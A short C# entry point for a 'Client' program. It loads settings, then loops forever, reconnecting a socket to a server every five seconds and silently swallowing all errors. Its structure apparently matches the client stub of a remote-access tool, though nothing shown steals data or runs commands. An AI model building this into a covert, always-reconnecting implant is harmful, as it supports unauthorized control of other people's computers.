using System.Threading;
using Client.Connection;
using System;
using Client.Helper;
using System.Net;
using System.Diagnostics;
using System.IO;


namespace Client
{
    public class Program
    {
        public static void Main()
        {

            
            

            if (!Settings.InitializeSettings()) Environment.Exit(0);






            
            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch (Exception exx) {

                    
                }
                Thread.Sleep(5000);
            }
        }
    }
}